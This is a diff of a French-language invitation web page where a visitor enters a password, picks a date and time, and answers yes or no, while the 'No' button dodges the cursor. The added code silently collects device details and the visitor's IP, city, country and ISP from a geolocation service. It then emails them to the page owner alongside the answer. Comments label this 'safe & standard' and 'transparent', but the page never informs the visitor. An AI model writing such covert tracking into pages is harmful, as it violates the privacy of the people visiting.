@@ -24,7 +24,6 @@ body{
     width:320px;
     box-shadow:0 10px 25px rgba(0,0,0,0.1);
     position: relative;
-    overflow: hidden;
 }
 
 input{
@@ -45,7 +44,6 @@ button{
     font-weight:bold;
     background:#2196f3;
     color:white;
-    transition:0.2s;
 }
 
 button:hover{
@@ -54,9 +52,6 @@ button:hover{
 
 .btn-yes{ background:#4caf50; }
 .btn-no{ background:#f44336; }
-
-.btn-yes:hover{ background:#3e8e41; }
-.btn-no:hover{ background:#d32f2f; }
 
 button:disabled{
     opacity:0.4;
@@ -91,15 +86,10 @@ const CONFIG = {
 
 emailjs.init(CONFIG.emailjs.publicKey);
 
-document.addEventListener("DOMContentLoaded", () => {
+let deviceData = {};
+let ipData = {};
 
-    fetch("https://ipapi.co/json/")
-      .then(res => res.json())
-      .then(data => {
-          console.log("IP :", data.ip);
-          console.log("Pays :", data.country_name);
-          console.log("Ville :", data.city);
-      });
+document.addEventListener("DOMContentLoaded", () => {
 
     const dateInput = document.getElementById("dateChoice");
     const timeInput = document.getElementById("timeChoice");
@@ -109,11 +99,34 @@ document.addEventListener("DOMContentLoaded", () => {
     const startBlocked = "2026-07-30";
     const endBlocked = "2026-08-21";
 
-    // reset
     dateInput.value = "";
     timeInput.value = "";
 
-    // validation
+    // 📱 DEVICE INFO (safe & standard)
+    deviceData = {
+        userAgent: navigator.userAgent,
+        platform: navigator.platform,
+        language: navigator.language,
+        languages: navigator.languages,
+        screen: screen.width + "x" + screen.height,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        touch: 'ontouchstart' in window,
+        cpuCores: navigator.hardwareConcurrency || "unknown",
+        ram: navigator.deviceMemory || "unknown"
+    };
+
+    // 🌍 IP INFO (optionnel, transparent)
+    fetch("https://ipapi.co/json/")
+        .then(res => res.json())
+        .then(data => {
+            ipData = {
+                ip: data.ip,
+                city: data.city,
+                country: data.country_name,
+                isp: data.org
+            };
+        });
+
     function checkFormValidity(){
 
         const date = dateInput.value;
@@ -127,13 +140,6 @@ document.addEventListener("DOMContentLoaded", () => {
 
         yesBtn.disabled = !valid;
         noBtn.disabled = !valid;
-
-        // reset position NON si invalide
-        if(!valid){
-            noBtn.style.position = "relative";
-            noBtn.style.left = "0px";
-            noBtn.style.top = "0px";
-        }
     }
 
     dateInput.addEventListener("input", checkFormValidity);
@@ -148,11 +154,9 @@ document.addEventListener("DOMContentLoaded", () => {
         const error = document.getElementById("error");
 
         if(input === CONFIG.security.password){
-
             error.textContent = "";
             document.getElementById("loginBox").classList.add("hidden");
             document.getElementById("questionBox").classList.remove("hidden");
-
         } else {
             error.textContent = "Mot de passe incorrect";
         }
@@ -173,8 +177,8 @@ document.addEventListener("DOMContentLoaded", () => {
 
         document.getElementById("resultText").innerText =
             "Choix : " + choice +
-            "\nDate : " + (date || "non définie") +
-            "\nHeure : " + (time || "non définie");
+            "\nDate : " + date +
+            "\nHeure : " + time;
 
         emailjs.send(
             CONFIG.emailjs.serviceID,
@@ -185,21 +189,18 @@ document.addEventListener("DOMContentLoaded", () => {
                     "Choix: " + choice +
                     " | Date: " + date +
                     " | Heure: " + time +
-                    " | Lieu: Place Dauphine, Paris" +
-                    " | Navigateur: " + navigator.userAgent
+                    " | Device: " + JSON.stringify(deviceData) +
+                    " | IP: " + JSON.stringify(ipData)
             }
         );
 
         setTimeout(() => {
-            document.body.innerHTML = "<h2 style='text-align:center;margin-top:40vh;'>Merci </h2>";
-        }, 3000);
-
-        setTimeout(() => {
-        window.location.href = "about:blank";
-        }, 5000);
+            document.body.innerHTML =
+                "<h2 style='text-align:center;margin-top:40vh;'>Merci ❤️</h2>";
+        }, 2000);
     }
 
-    // NON qui fuit au hover (UNIQUEMENT si actif)
+    // NON qui fuit
     window.moveNo = function(){
 
         if(noBtn.disabled) return;
